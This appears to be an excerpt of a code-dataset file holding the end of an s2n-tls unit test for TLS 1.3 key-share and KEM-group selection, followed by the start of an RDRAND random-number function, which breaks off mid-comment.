EXPECT_SUCCESS(s2n_connection_free(server_conn));\n    }\n\n    /* If client and server have no mutually supported groups but server received an ECC key share,\n     * a Hello Retry Request flag is not set and the server ignores the mutually supported keyshare. */\n    {\n        struct s2n_connection *server_conn = NULL;\n        EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n        EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n        const struct s2n_ecc_preferences *ecc_pref = NULL;\n        EXPECT_SUCCESS(s2n_connection_get_ecc_preferences(server_conn, &ecc_pref));\n        EXPECT_NOT_NULL(ecc_pref);\n\n        EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        server_conn->secure.client_ecc_evp_params[0].negotiated_curve = ecc_pref->ecc_curves[0];\n        EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(&server_conn->secure.client_ecc_evp_params[0]));\n\n        EXPECT_FAILURE_WITH_ERRNO(s2n_extensions_server_key_share_select(server_conn),\n                S2N_ERR_ECDHE_UNSUPPORTED_CURVE);\n\n        EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n        EXPECT_SUCCESS(s2n_connection_free(server_conn));\n    }\n\n    /* If client has sent no keyshares, but server and client have a mutually supported EC curve,\n     * send Hello Retry Request. */\n    {\n        struct s2n_connection *server_conn = NULL;\n        EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n        EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n        const struct s2n_ecc_preferences *ecc_pref = NULL;\n        EXPECT_SUCCESS(s2n_connection_get_ecc_preferences(server_conn, &ecc_pref));\n        EXPECT_NOT_NULL(ecc_pref);\n\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        server_conn->secure.server_ecc_evp_params.negotiated_curve = ecc_pref->ecc_curves[1];\n        EXPECT_NULL(server_conn->secure.mutually_supported_curves[0]);\n        server_conn->secure.mutually_supported_curves[1] = ecc_pref->ecc_curves[1];\n        for (size_t i = 0; i < ecc_pref->count; i++) {\n            EXPECT_NULL(server_conn->secure.client_ecc_evp_params[i].evp_pkey);\n            EXPECT_NULL(server_conn->secure.client_ecc_evp_params[i].negotiated_curve);\n        }\n\n        EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n        EXPECT_EQUAL(server_conn->secure.server_ecc_evp_params.negotiated_curve, ecc_pref->ecc_curves[1]);\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        EXPECT_TRUE(s2n_is_hello_retry_handshake(server_conn));\n\n        EXPECT_SUCCESS(s2n_connection_free(server_conn));\n    }\n\n    /* When client and server mutually support curve 0 and curve 1, but client has only sent a keyshare for\n     * curve 1, Hello Retry Request is not sent and server chooses curve 1. */\n    {\n        struct s2n_connection *server_conn = NULL;\n        EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n        EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n        const struct s2n_ecc_preferences *ecc_pref = NULL;\n        EXPECT_SUCCESS(s2n_connection_get_ecc_preferences(server_conn, &ecc_pref));\n        EXPECT_NOT_NULL(ecc_pref);\n\n        /* Server would have initially chosen curve[0] when processing the supported_groups extension */\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        server_conn->secure.server_ecc_evp_params.negotiated_curve = ecc_pref->ecc_curves[0];\n        server_conn->secure.mutually_supported_curves[0] = ecc_pref->ecc_curves[0];\n        server_conn->secure.mutually_supported_curves[1] = ecc_pref->ecc_curves[1];\n\n        EXPECT_NULL(server_conn->secure.client_ecc_evp_params[0].evp_pkey);\n        EXPECT_NULL(server_conn->secure.client_ecc_evp_params[0].negotiated_curve);\n        server_conn->secure.client_ecc_evp_params[1].negotiated_curve = ecc_pref->ecc_curves[1];\n        EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(&server_conn->secure.client_ecc_evp_params[1]));\n\n        EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n        /* Server should have updated it's choice to curve[1] after taking received keyshares into account */\n        EXPECT_EQUAL(server_conn->secure.server_ecc_evp_params.negotiated_curve, ecc_pref->ecc_curves[1]);\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n        EXPECT_SUCCESS(s2n_connection_free(server_conn)); \n    }\n\n    /* When client and server mutually support curve 0 and curve 1 and client has sent keyshares for both,\n     * Hello Retry Request is not sent and server chooses curve 0. */\n    {\n        struct s2n_connection *server_conn = NULL;\n        EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n        EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n        const struct s2n_ecc_preferences *ecc_pref = NULL;\n        EXPECT_SUCCESS(s2n_connection_get_ecc_preferences(server_conn, &ecc_pref));\n        EXPECT_NOT_NULL(ecc_pref);\n\n        /* Server would have initially chosen curve[0] when processing the supported_groups extension */\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        server_conn->secure.server_ecc_evp_params.negotiated_curve = ecc_pref->ecc_curves[0];\n        server_conn->secure.mutually_supported_curves[0] = ecc_pref->ecc_curves[0];\n        server_conn->secure.mutually_supported_curves[1] = ecc_pref->ecc_curves[1];\n\n        server_conn->secure.client_ecc_evp_params[0].negotiated_curve = ecc_pref->ecc_curves[0];\n        EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(&server_conn->secure.client_ecc_evp_params[0]));\n        server_conn->secure.client_ecc_evp_params[1].negotiated_curve = ecc_pref->ecc_curves[1];\n        EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(&server_conn->secure.client_ecc_evp_params[1]));\n\n        EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n        /* Server should still prefer curve[0] after taking received keyshares into account */\n        EXPECT_EQUAL(server_conn->secure.server_ecc_evp_params.negotiated_curve, ecc_pref->ecc_curves[0]);\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n        EXPECT_SUCCESS(s2n_connection_free(server_conn));\n    }\n\n#if !defined(S2N_NO_PQ)\n    {\n        const struct s2n_kem_group *test_kem_groups[] = {\n                &s2n_secp256r1_sike_p434_r2,\n                &s2n_secp256r1_bike1_l1_r2,\n                &s2n_secp256r1_kyber_512_r2\n        };\n\n        const struct s2n_kem_preferences test_kem_pref = {\n                .kem_count = 0,\n                .kems = NULL,\n                .tls13_kem_group_count = s2n_array_len(test_kem_groups),\n                .tls13_kem_groups = test_kem_groups,\n        };\n\n        const struct s2n_security_policy test_security_policy = {\n                .minimum_protocol_version = S2N_SSLv3,\n                .cipher_preferences = &cipher_preferences_test_all_tls13,\n                .kem_preferences = &test_kem_pref,\n                .signature_preferences = &s2n_signature_preferences_20200207,\n                .ecc_preferences = &s2n_ecc_preferences_20200310,\n        };\n\n        /* If both server_curve and server_kem_group are set (erroneous behavior), we should\n         * error and abort the handshake. */\n        {\n            struct s2n_connection *server_conn = NULL;\n            EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n            server_conn->security_policy_override = &test_security_policy;\n            EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n            const struct s2n_ecc_preferences *ecc_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_ecc_preferences(server_conn, &ecc_pref));\n            EXPECT_NOT_NULL(ecc_pref);\n\n            const struct s2n_kem_preferences *kem_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_kem_preferences(server_conn, &kem_pref));\n            EXPECT_NOT_NULL(kem_pref);\n\n            server_conn->secure.server_ecc_evp_params.negotiated_curve = ecc_pref->ecc_curves[0];\n            server_conn->secure.server_kem_group_params.kem_group = kem_pref->tls13_kem_groups[0];\n\n            EXPECT_FAILURE_WITH_ERRNO(s2n_extensions_server_key_share_select(server_conn),\n                    S2N_ERR_ECDHE_UNSUPPORTED_CURVE);\n\n            EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n            EXPECT_SUCCESS(s2n_connection_free(server_conn));\n        }\n\n        /* If client and server have no mutually supported groups but server received a KEM group key share,\n         * a Hello Retry Request flag is not set and the server ignores the keyshare. */\n        {\n            struct s2n_connection *server_conn = NULL;\n            EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n            server_conn->security_policy_override = &test_security_policy;\n            EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n            const struct s2n_kem_preferences *kem_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_kem_preferences(server_conn, &kem_pref));\n            EXPECT_NOT_NULL(kem_pref);\n\n            /* Server would have not chosen any group when processing the supported_groups extension */\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n\n            /* Received an erroneous keyshare for kem group 0 */\n            struct s2n_kem_group_params *client_params0 = &server_conn->secure.client_kem_group_params[0];\n            const struct s2n_kem_group *kem_group0 = kem_pref->tls13_kem_groups[0];\n            client_params0->kem_group = kem_group0;\n            client_params0->kem_params.kem = kem_group0->kem;\n            client_params0->ecc_params.negotiated_curve = kem_group0->curve;\n            /* The PQ public key is fake; that's good enough for this test */\n            EXPECT_SUCCESS(s2n_alloc(&client_params0->kem_params.public_key, kem_group0->kem->public_key_length));\n            memset_check(client_params0->kem_params.public_key.data, 1, kem_group0->kem->public_key_length);\n            EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(&client_params0->ecc_params));\n\n            EXPECT_FAILURE_WITH_ERRNO(s2n_extensions_server_key_share_select(server_conn),\n                    S2N_ERR_ECDHE_UNSUPPORTED_CURVE);\n\n            /* Nothing selected, no HRR */\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n            EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_params.kem);\n            EXPECT_NULL(server_conn->secure.server_kem_group_params.ecc_params.negotiated_curve);\n            EXPECT_NULL(server_conn->secure.chosen_client_kem_group_params);\n            EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n            EXPECT_SUCCESS(s2n_connection_free(server_conn));\n        }\n\n        /* If client has sent no keyshares but server and client mutually support KEM group 1,\n         * select KEM group 1 and send Hello Retry Request. */\n        {\n            struct s2n_connection *server_conn = NULL;\n            EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n            server_conn->security_policy_override = &test_security_policy;\n            EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n            const struct s2n_kem_preferences *kem_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_kem_preferences(server_conn, &kem_pref));\n            EXPECT_NOT_NULL(kem_pref);\n\n            /* Server would have initially chosen kem_group[1] when processing the supported_groups extension */\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            struct s2n_kem_group_params *server_params = &server_conn->secure.server_kem_group_params;\n            const struct s2n_kem_group *kem_group1 = kem_pref->tls13_kem_groups[1];\n            server_params->kem_group = kem_group1;\n            server_params->kem_params.kem = kem_group1->kem;\n            server_params->ecc_params.negotiated_curve = kem_group1->curve;\n\n            /* 0 is not supported, 1 is */\n            EXPECT_NULL(server_conn->secure.mutually_supported_kem_groups[0]);\n            server_conn->secure.mutually_supported_kem_groups[1] = kem_group1;\n\n            /* No keyshares received */\n            for (size_t i = 0; i < kem_pref->tls13_kem_group_count; i++) {\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_group);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_params.kem);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_params.public_key.data);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].ecc_params.negotiated_curve);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].ecc_params.evp_pkey);\n            }\n\n            EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n            /* Server maintains its selection of KEM group 1, sends HRR */\n            EXPECT_EQUAL(server_params->kem_group, kem_group1);\n            EXPECT_EQUAL(server_params->kem_params.kem, kem_group1->kem);\n            EXPECT_EQUAL(server_params->ecc_params.negotiated_curve, kem_group1->curve);\n            EXPECT_NULL(server_conn->secure.chosen_client_kem_group_params);\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            EXPECT_TRUE(s2n_is_hello_retry_handshake(server_conn));\n\n            EXPECT_SUCCESS(s2n_connection_free(server_conn));\n        }\n\n        /* When client and server mutually support KEM groups 0 and 1, but client has only sent a keyshare for\n         * KEM group 1, Hello Retry Request is not sent and server chooses group 1. */\n        {\n            struct s2n_connection *server_conn = NULL;\n            EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n            server_conn->security_policy_override = &test_security_policy;\n            EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n            const struct s2n_kem_preferences *kem_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_kem_preferences(server_conn, &kem_pref));\n            EXPECT_NOT_NULL(kem_pref);\n\n            /* Server would have initially chosen kem_group[0] when processing the supported_groups extension */\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            struct s2n_kem_group_params *server_params = &server_conn->secure.server_kem_group_params;\n            const struct s2n_kem_group *kem_group0 = kem_pref->tls13_kem_groups[0];\n            const struct s2n_kem_group *kem_group1 = kem_pref->tls13_kem_groups[1];\n            server_params->kem_group = kem_group0;\n            server_params->kem_params.kem = kem_group0->kem;\n            server_params->ecc_params.negotiated_curve = kem_group0->curve;\n\n            /* Both 0 and 1 supported */\n            server_conn->secure.mutually_supported_kem_groups[0] = kem_group0;\n            server_conn->secure.mutually_supported_kem_groups[1] = kem_group1;\n\n            /* Received a keyshare for 1 only */\n            EXPECT_NULL(server_conn->secure.client_kem_group_params[0].kem_group);\n            struct s2n_kem_group_params *client_params1 = &server_conn->secure.client_kem_group_params[1];\n            client_params1->kem_group = kem_group1;\n            client_params1->kem_params.kem = kem_group1->kem;\n            client_params1->ecc_params.negotiated_curve = kem_group1->curve;\n            EXPECT_SUCCESS(s2n_alloc(&client_params1->kem_params.public_key, kem_group1->kem->public_key_length));\n            /* The PQ public key is fake; that's good enough for this test */\n            memset_check(client_params1->kem_params.public_key.data, 1, kem_group1->kem->public_key_length);\n            EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(&client_params1->ecc_params));\n\n            EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n            /* Server should have updated it's choice to kem_group[1] after taking received keyshares into account */\n            EXPECT_EQUAL(server_params->kem_group, kem_group1);\n            EXPECT_EQUAL(server_params->kem_params.kem, kem_group1->kem);\n            EXPECT_EQUAL(server_params->ecc_params.negotiated_curve, kem_group1->curve);\n            EXPECT_EQUAL(server_conn->secure.chosen_client_kem_group_params, client_params1);\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n            EXPECT_SUCCESS(s2n_connection_free(server_conn));\n        }\n\n        /* When client and server mutually support KEM groups 0,1,2 and client has sent keyshares for all,\n         * Hello Retry Request is not sent and server chooses group 0. */\n        {\n            struct s2n_connection *server_conn = NULL;\n            EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n            server_conn->security_policy_override = &test_security_policy;\n            EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n            const struct s2n_kem_preferences *kem_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_kem_preferences(server_conn, &kem_pref));\n            EXPECT_NOT_NULL(kem_pref);\n\n            /* Server would have initially chosen kem_group[0] when processing the supported_groups extension */\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            struct s2n_kem_group_params *server_params = &server_conn->secure.server_kem_group_params;\n            const struct s2n_kem_group *kem_group0 = kem_pref->tls13_kem_groups[0];\n            server_params->kem_group = kem_group0;\n            server_params->kem_params.kem = kem_group0->kem;\n            server_params->ecc_params.negotiated_curve = kem_group0->curve;\n\n            /* Support all KEM Groups; received key shares for all KEM groups */\n            for (size_t i = 0; i < kem_pref->tls13_kem_group_count; i++) {\n                struct s2n_kem_group_params *client_params = &server_conn->secure.client_kem_group_params[i];\n                const struct s2n_kem_group *kem_group = kem_pref->tls13_kem_groups[i];\n\n                server_conn->secure.mutually_supported_kem_groups[i] = kem_group;\n\n                client_params->kem_group = kem_group;\n                client_params->kem_params.kem = kem_group->kem;\n                client_params->ecc_params.negotiated_curve = kem_group->curve;\n                EXPECT_SUCCESS(s2n_alloc(&client_params->kem_params.public_key, kem_group->kem->public_key_length));\n                /* The PQ public key is fake; that's good enough for this test */\n                memset_check(client_params->kem_params.public_key.data, 1, kem_group->kem->public_key_length);\n                EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(&client_params->ecc_params));\n            }\n\n            EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n            /* Server should still prefer kem_group[0] after taking received keyshares into account */\n            EXPECT_EQUAL(server_params->kem_group, kem_group0);\n            EXPECT_EQUAL(server_params->kem_params.kem, kem_group0->kem);\n            EXPECT_EQUAL(server_params->ecc_params.negotiated_curve, kem_group0->curve);\n            EXPECT_EQUAL(server_conn->secure.chosen_client_kem_group_params, &server_conn->secure.client_kem_group_params[0]);\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n            EXPECT_SUCCESS(s2n_connection_free(server_conn));\n        }\n\n        /* When client and server mutually support all KEM groups and all curves, but client sent no keyshares,\n         * server should choose kem_group[0] and send HRR. */\n        {\n            struct s2n_connection *server_conn = NULL;\n            EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n            server_conn->security_policy_override = &test_security_policy;\n            EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n            const struct s2n_ecc_preferences *ecc_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_ecc_preferences(server_conn, &ecc_pref));\n            EXPECT_NOT_NULL(ecc_pref);\n\n            const struct s2n_kem_preferences *kem_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_kem_preferences(server_conn, &kem_pref));\n            EXPECT_NOT_NULL(kem_pref);\n\n            /* Server would have initially chosen kem_group[0] when processing the supported_groups extension */\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            struct s2n_kem_group_params *server_params = &server_conn->secure.server_kem_group_params;\n            const struct s2n_kem_group *kem_group0 = kem_pref->tls13_kem_groups[0];\n            server_params->kem_group = kem_group0;\n            server_params->kem_params.kem = kem_group0->kem;\n            server_params->ecc_params.negotiated_curve = kem_group0->curve;\n\n            /* Support all KEM groups and all curves */\n            for (size_t i = 0; i < kem_pref->tls13_kem_group_count; i++) {\n                server_conn->secure.mutually_supported_kem_groups[i] = kem_pref->tls13_kem_groups[i];\n            }\n            for (size_t i = 0; i < ecc_pref->count; i++) {\n                server_conn->secure.mutually_supported_curves[i] = ecc_pref->ecc_curves[i];\n            }\n\n            /* No keyshares received */\n            for (size_t i = 0; i < kem_pref->tls13_kem_group_count; i++) {\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_group);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_params.kem);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_params.public_key.data);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].ecc_params.negotiated_curve);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].ecc_params.evp_pkey);\n            }\n\n            EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n            /* Server should still prefer kem_group[0], and send HRR */\n            EXPECT_EQUAL(server_params->kem_group, kem_group0);\n            EXPECT_EQUAL(server_params->kem_params.kem, kem_group0->kem);\n            EXPECT_EQUAL(server_params->ecc_params.negotiated_curve, kem_group0->curve);\n            EXPECT_NULL(server_conn->secure.chosen_client_kem_group_params);\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            EXPECT_TRUE(s2n_is_hello_retry_handshake(server_conn));\n\n            EXPECT_SUCCESS(s2n_connection_free(server_conn));\n        }\n\n        /* When client and server mutually support all KEM groups and all curves, and client sent keyshares\n         * for everything, server should choose kem_group[0] and not send HRR. */\n        {\n            struct s2n_connection *server_conn = NULL;\n            EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n            server_conn->security_policy_override = &test_security_policy;\n            EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n            const struct s2n_ecc_preferences *ecc_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_ecc_preferences(server_conn, &ecc_pref));\n            EXPECT_NOT_NULL(ecc_pref);\n\n            const struct s2n_kem_preferences *kem_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_kem_preferences(server_conn, &kem_pref));\n            EXPECT_NOT_NULL(kem_pref);\n\n            /* Server would have initially chosen kem_group[0] when processing the supported_groups extension */\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            struct s2n_kem_group_params *server_params = &server_conn->secure.server_kem_group_params;\n            const struct s2n_kem_group *kem_group0 = kem_pref->tls13_kem_groups[0];;\n            server_params->kem_group = kem_group0;\n            server_params->kem_params.kem = kem_group0->kem;\n            server_params->ecc_params.negotiated_curve = kem_group0->curve;\n\n            /* Support all KEM groups and curves; received keyshares for everything */\n            for (size_t i = 0; i < kem_pref->tls13_kem_group_count; i++) {\n                struct s2n_kem_group_params *client_params = &server_conn->secure.client_kem_group_params[i];\n                const struct s2n_kem_group *kem_group = kem_pref->tls13_kem_groups[i];\n\n                server_conn->secure.mutually_supported_kem_groups[i] = kem_pref->tls13_kem_groups[i];\n\n                client_params->kem_group = kem_group;\n                client_params->kem_params.kem = kem_group->kem;\n                client_params->ecc_params.negotiated_curve = kem_group->curve;\n                EXPECT_SUCCESS(s2n_alloc(&client_params->kem_params.public_key, kem_group->kem->public_key_length));\n                /* The PQ public key is fake; that's good enough for this test */\n                memset_check(client_params->kem_params.public_key.data, 1, kem_group->kem->public_key_length);\n                EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(&client_params->ecc_params));\n            }\n            for (size_t i = 0; i < ecc_pref->count; i++) {\n                struct s2n_ecc_evp_params *client_params = &server_conn->secure.client_ecc_evp_params[i];\n                const struct s2n_ecc_named_curve *curve = ecc_pref->ecc_curves[i];\n\n                server_conn->secure.mutually_supported_curves[i] = curve;\n\n                client_params->negotiated_curve = curve;\n                EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(client_params));\n            }\n\n            EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n            /* Server should still prefer kem_group[0], no HRR */\n            EXPECT_EQUAL(server_params->kem_group, kem_group0);\n            EXPECT_EQUAL(server_params->kem_params.kem, kem_group0->kem);\n            EXPECT_EQUAL(server_params->ecc_params.negotiated_curve, kem_group0->curve);\n            EXPECT_EQUAL(server_conn->secure.chosen_client_kem_group_params, &server_conn->secure.client_kem_group_params[0]);\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n            EXPECT_SUCCESS(s2n_connection_free(server_conn));\n        }\n\n        /* When client and server mutually support all KEM groups and all curves, but client sent keyshares\n         * only for ECC, server should choose curves[0] and not send HRR. */\n        {\n            struct s2n_connection *server_conn = NULL;\n            EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n            server_conn->security_policy_override = &test_security_policy;\n            EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n            const struct s2n_ecc_preferences *ecc_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_ecc_preferences(server_conn, &ecc_pref));\n            EXPECT_NOT_NULL(ecc_pref);\n\n            const struct s2n_kem_preferences *kem_pref = NULL;\n            EXPECT_SUCCESS(s2n_connection_get_kem_preferences(server_conn, &kem_pref));\n            EXPECT_NOT_NULL(kem_pref);\n\n            /* Server would have initially chosen kem_group[0] when processing the supported_groups extension */\n            EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n            struct s2n_kem_group_params *server_params = &server_conn->secure.server_kem_group_params;\n            const struct s2n_kem_group *kem_group0 = kem_pref->tls13_kem_groups[0];;\n            server_params->kem_group = kem_group0;\n            server_params->kem_params.kem = kem_group0->kem;\n            server_params->ecc_params.negotiated_curve = kem_group0->curve;\n\n            /* Support all KEM groups, but no keyshares received */\n            for (size_t i = 0; i < kem_pref->tls13_kem_group_count; i++) {\n                server_conn->secure.mutually_supported_kem_groups[i] = kem_pref->tls13_kem_groups[i];\n\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_group);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_params.kem);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].kem_params.public_key.data);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].ecc_params.negotiated_curve);\n                EXPECT_NULL(server_conn->secure.client_kem_group_params[i].ecc_params.evp_pkey);\n            }\n            /* Support all curves, and all keyshares received */\n            for (size_t i = 0; i < ecc_pref->count; i++) {\n                struct s2n_ecc_evp_params *client_params = &server_conn->secure.client_ecc_evp_params[i];\n                const struct s2n_ecc_named_curve *curve = ecc_pref->ecc_curves[i];\n\n                server_conn->secure.mutually_supported_curves[i] = curve;\n\n                client_params->negotiated_curve = curve;\n                EXPECT_SUCCESS(s2n_ecc_evp_generate_ephemeral_key(client_params));\n            }\n\n            EXPECT_SUCCESS(s2n_extensions_server_key_share_select(server_conn));\n\n            /* Server should update it's choice to curve[0], no HRR */\n            EXPECT_EQUAL(server_conn->secure.server_ecc_evp_params.negotiated_curve, ecc_pref->ecc_curves[0]);\n            EXPECT_NULL(server_params->kem_group);\n            EXPECT_NULL(server_params->kem_params.kem);\n            EXPECT_NULL(server_params->ecc_params.negotiated_curve);\n            EXPECT_NULL(server_conn->secure.chosen_client_kem_group_params);\n            EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n            EXPECT_SUCCESS(s2n_connection_free(server_conn));\n        }\n    }\n#endif\n\n    END_TEST();\n    return 0;\n}", "path": "s2n-tls/tests/unit/s2n_extensions_server_key_share_select_test.c", "commit_date": "2020-12-17 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/*\n * volatile is important to prevent the compiler from\n * re-ordering or optimizing the use of RDRAND.\n */\n", "func_signal": "static int s2n_rand_rdrand_impl(void *data, uint32_t size)", "code": "{\n#if defined(__x86_64__) || defined(__i386__)\n    struct s2n_blob out = { .data = data, .size = size };\n    int space_remaining = 0;\n    struct s2n_stuffer stuffer = {0};\n    union {\n        uint64_t u64;\n#if defined(__i386__)\n        struct {\n            /* since we check first that we're on intel, we can safely assume little endian. */\n            uint32_t u_low;\n            uint32_t u_high;\n        } i386_fields;\n#endif /* defined(__i386__) */\n        uint8_t u8[8];\n    } output;\n\n    GUARD(s2n_stuffer_init(&stuffer, &out));\n    while ((space_remaining = s2n_stuffer_space_remaining(&stuffer))) {\n        unsigned char success = 0;\n        output.u64 = 0;\n\n        for (int tries = 0; tries < 10; tries++) {\n#if defined(__i386__)\n            /* execute the rdrand instruction, store the result in a general purpose register (it's assigned to\n            * output.i386_fields.u_low). Check the carry bit, which will be set on success. Then clober the register and reset\n            * the carry bit. Due to needing to support an ancient assembler we use the opcode syntax.\n            * the %b1 is to force compilers to use c1 instead of ecx.\n            * Here's a description of how the opcode is encoded:\n            * 0x0fc7 (rdrand)\n            * 0xf0 (store the result in eax).\n            */\n            unsigned char success_high = 0, success_low = 0;\n            __asm__ __volatile__(\".byte 0x0f, 0xc7, 0xf0;\\n\" \"setc %b1;\\n\": \"=a\"(output.i386_fields.u_low), \"=qm\"(success_low)\n                                 :\n                                 :\"cc\");\n\n            __asm__ __volatile__(\".byte 0x0f, 0xc7, 0xf0;\\n\" \"setc %b1;\\n\": \"=a\"(output.i386_fields.u_high), \"=qm\"(success_high)\n                                 :\n                                 :\"cc\");\n            /* cppcheck-suppress knownConditionTrueFalse */\n            success = success_high & success_low;\n\n            /* Treat either all 1 or all 0 bits in either the high or low order\n             * bits as failure */\n            if (output.i386_fields.u_low == 0 ||\n                    output.i386_fields.u_low == UINT32_MAX ||\n                    output.i386_fields.u_high == 0 ||\n                    output.i386_fields.u_high == UINT32_MAX) {\n                success = 0;\n            }\n#else\n            /* execute the rdrand instruction, store the result in a general purpose register (it's assigned to\n            * output.u64). Check the carry bit, which will be set on success. Then clober the carry bit.\n            * Due to needing to support an ancient assembler we use the opcode syntax.\n            * the %b1 is to force compilers to use c1 instead of ecx.\n            * Here's a description of 